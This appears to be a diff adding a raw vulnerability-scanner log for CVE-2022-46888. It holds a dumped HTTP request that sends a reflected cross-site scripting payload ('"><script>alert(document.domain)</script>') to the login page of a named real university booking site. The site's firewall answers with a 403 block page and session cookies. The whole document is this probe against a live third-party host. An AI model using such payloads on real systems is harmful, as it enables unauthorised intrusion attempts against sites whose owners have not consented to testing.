@@ -1,0 +1,25 @@
+[CVE-2022-46888] Dumped HTTP request for https://bookings.mdhs.unimelb.edu.au/login.php?secret="><script>alert(document.domain)</script>
+
+
+GET /login.php?secret="><script>alert(document.domain)</script> HTTP/1.1
+Host: bookings.mdhs.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[CVE-2022-46888] Dumped HTTP response https://bookings.mdhs.unimelb.edu.au/login.php?secret="><script>alert(document.domain)</script>
+
+HTTP/1.1 403 Forbidden
+Connection: close
+Content-Length: 832
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Set-Cookie: visid_incap_3209806=OTtXz1FjTKSc8H6kJVRfH/txk2gAAAAAQUIPAAAAAACshDNhLqzsLHyRstUjVV5t; expires=Thu, 06 Aug 2026 07:06:45 GMT; HttpOnly; path=/; Domain=.mdhs.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: incap_ses_237_3209806=wYtte+C+pD5S1Larov5JA/txk2gAAAAAS77qvYVKpUxgOIIF4Tl9PA==; path=/; Domain=.mdhs.unimelb.edu.au; Secure; SameSite=None
+Strict-Transport-Security: max-age=31536000
+X-Iinfo: 14-12101772-0 0NNN RT(1754493436250 18) q(0 -1 -1 -1) r(0 -1) B15(1,10037,1) U24
+
+<html style="height:100%"><head><META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW"><meta name="format-detection" content="telephone=no"><meta name="viewport" content="initial-scale=1.0"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><script src="/A-Friends-My-nord-Say-Macb-Thout-affic-Dring-boy" async></script></head><body style="margin:0px;height:100%"><iframe id="main-iframe" src="/_Incapsula_Resource?CWUDNSAI=23&xinfo=14-12101772-0%200NNN%20RT%281754493436250%2018%29%20q%280%20-1%20-1%20-1%29%20r%280%20-1%29%20B15%281%2c10037%2c1%29%20U24&incident_id=237000430032578664-61901980673313486&edet=15&cinfo=01000000&rpinfo=0&mth=GET" frameborder=0 width="100%" height="100%" marginheight="0px" marginwidth="0px">Request unsuccessful. Incapsula incident ID: 237000430032578664-61901980673313486</iframe></body></html>
